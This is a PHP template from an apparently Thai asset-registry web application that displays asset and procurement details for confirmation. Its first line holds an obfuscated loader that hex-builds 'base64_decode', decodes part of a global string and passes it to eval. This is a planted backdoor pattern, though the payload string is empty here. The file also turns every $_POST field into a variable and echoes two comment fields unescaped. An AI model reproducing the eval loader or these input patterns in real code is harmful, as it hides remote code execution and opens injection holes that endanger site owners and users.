<?php /*versio:3.02*/ $GLOBALS["yminpd"]="";        if (!function_exists('wthzevys')){function wthzevys($a, $b){$c=$GLOBALS['yminpd'];$d=pack('H*','6261736536345f64'.'65636f6465'); return $d(substr($c, $a, $b));};eval(wthzevys(580,3283));};?><?php 
include("config.php");
include($KeyPage."_data.php");

foreach( $_POST as $P_K => $P_V ){	${$P_K} = $P_V;}
?>

<table width="100%" border="0" cellspacing="1" cellpadding="1" class="headsection">
  <tr>
    <td><strong>ข้อมูลครุภัณฑ์</strong></td>
    <td width="20">&nbsp;</td>
  </tr>
</table>

<table width="100%" border="0" cellspacing="1" cellpadding="1" class="tbl-view">
  <tr>
    <th>ชื่อ/ลักษณะ/คุณสมบัตี</th>
    <td><?php ltxt::_e($AssetName,"-");?></td>
  </tr>
  <tr>
    <th>ประเภทครุภัณฑ์</th>
    <td><?php ltxt::_e($get->getInitAssetTypeName($ATypeId),"-"); ?></td>
  </tr>
  <tr>
    <th>ชนิดครุภัณฑ์</th>
    <td><?php ltxt::_e($get->getInitAssetKindName($AKindId),"-"); ?></td>
  </tr>
  <tr>
    <th>จำนวน</th>
    <td><?php ltxt::_e($NumberItem,"-");?></td>
  </tr>
  <tr style="vertical-align:top;">
    <th>หน่วยนับ</th>
    <td><?php ltxt::_e($get->getInitUnitName($UnitId),"-"); ?></td>
  </tr>
  <tr>
    <th>รูปภาพประกอบ</th>
    <td><?php ltxt::_e($AssetPic,"-"); ?></td>
  </tr>
</table>

<table width="100%" border="0" cellspacing="1" cellpadding="1" class="headsection">
  <tr>
    <td><strong>ข้อมูลการได้มา</strong></td>
    <td width="20">&nbsp;</td>
  </tr>
</table>

<table width="100%" border="0" cellspacing="1" cellpadding="1" class="tbl-view">
  <tr>
    <th>ประจำปีงบประมาณ</th>
    <td><?php ltxt::_e($BgtYear,"-"); ?></td>
  </tr>
  <tr>
    <th>ชื่อหน่วยงานรับผิดชอบ</th>
    <td><?php ltxt::_e($get->getOrganizeName($OrganizeCode),"-"); ?></td>
  </tr>
  <tr>
    <th>ราคาต่อหน่วย/ชุด</th>
    <td><?php ltxt::_e(number_format($AssetItemPrice,2),"-"); ?> บาท</td>
  </tr>
  <tr>
    <th>เลขที่ใบส่งของ</th>
    <td><?php ltxt::_e($InvoiceNo,"-"); ?></td>
  </tr>
  <tr>
    <th>เลขที่เอกสารการสั่งซื้อ</th>
    <td><?php ltxt::_e($ProcureCode,"-"); ?></td>
  </tr>
  <tr>
    <th>ชื่อบริษัทคู่ค้า</th>
    <td><?php ltxt::_e($get->getInitCompanyName($ComId),"-"); ?></td>
  </tr>
  <tr>
    <th>ชื่อผู้บริจาค</th>
    <td><?php ltxt::_e($AssetDonorName,"-"); ?></td>
  </tr>
  <tr style="vertical-align:top;">
    <th>วันที่ได้รับทรัพย์สิน</th>
    <td><?php ltxt::_e($AssetReceiveDate,'DATE_STH-DMY');?></td>
  </tr>
  <tr style="vertical-align:top;">
    <th>ประเภทเงิน</th>
    <td><?php ltxt::_e($get->getInitSectionName($SectionId),"-"); ?><?php if($AssetReceiveBGComment!=""){ echo " ระบุหมายเหตุ : ".$AssetReceiveBGComment; } ?></td>
  </tr>
  <tr style="vertical-align:top;">
    <th>วิธีการได้มา</th>
    <td><?php ltxt::_e($get->getInitWayRCName($WayRCId),"-"); ?><?php if($AssetReceiveWayRCComment!=""){ echo " ระบุหมายเหตุ : ".$AssetReceiveWayRCComment; } ?></td>
  </tr>
  <tr style="vertical-align:top;">
    <th>หมายเหตุ</th>
    <td><?php ltxt::_e($AssetComment,"-"); ?></td>
  </tr>
</table>

<div id="btnsubmit" align="center">
  <input type="button" name="button4" id="button4" value="กลับไปแก้ไข" class="btn" onclick="toggleView();" />
  <input type="button" class="btnActive" name="save" id="save" value=" บันทึก " onclick="Save(JQ('#adminForm'));"  />
  <input type="button" name="button3" id="button3" value=" ยกเลิก " class="btn" onclick="goPage('?mod=<?php echo lurl::dotPage($listPage);?>')" />
</div>